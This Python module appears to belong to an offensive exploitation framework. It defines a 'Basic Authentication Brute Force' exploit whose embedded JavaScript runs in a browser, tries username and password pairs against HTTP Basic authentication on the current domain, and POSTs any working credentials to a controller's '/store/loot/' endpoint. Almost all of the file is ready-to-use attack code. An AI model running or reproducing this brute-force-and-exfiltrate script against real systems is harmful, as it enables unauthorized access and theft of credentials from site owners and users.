#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


from lib.module.exploit import ExploitClass
from lib.module import payload
from lib.module.safety import Safety
from lib.module.intrusiveness import Intrusiveness

class ExploitModule(ExploitClass):
    def __init__(self):
        super().__init__(**{
            'Name': 'Basic Authentication Brute Force',
            'Description': "Perform brute force detection of username and passwords.",
            'Options': ["LIST_USERNAMES", "LIST_PASSWORDS"],
            'Store': ["USERNAME", "USERPASS"],
            'Ports': [80, 8080, 8888],
            'RedoServiceDetection': True,
            'classification': (Safety.SAFE, Intrusiveness.BRUTE_FORCE),
            'products':[
                {"product":"Generic Web Server Unauthorized Basic"}
            ]
        })

    def exploit_code(self, payload):
        code = """
var usernames = ${LIST_USERNAMES};
var passes = ${LIST_PASSWORDS};
var sendlist = [];
function receive_response(xhr, method, resource, data, user, pass)   {
    if(xhr.status == 200)   {
        var json = JSON.stringify({"USERNAME":user, "USERPASS": pass});
        Network.request("POST", "${HOME}" + "/store/loot/" + document.domain, json, function(xhr)
        {
            Network.request("POST",
                "${HOME}" + "/module/finished/" + document.domain + "/${MODID}/success",
                null, console.log);
        });
    }
    else if(sendlist.length > 0)    {
        var get = sendlist.pop();
        Network.request_advanced("GET", "/", null, receive_response, null, null, get["username"], get["password"]);
    }
    else    {
        Network.request("POST",
            "${HOME}" + "/module/finished/" + document.domain + "/${MODID}/failed",
            null, console.log);
    }
}
for(var i = 0; i < usernames.length; i++)   {
    sendlist.push({"username":usernames[i], "password":usernames[i]});
    for(var j = 0; j < passes.length; j++)   {
        sendlist.push({"username":usernames[i], "password":passes[j]});
    }
}
var get = sendlist.pop();
Network.request_advanced("GET", "/", null, receive_response, null, null, get["username"], get["password"]);
"""
        return code
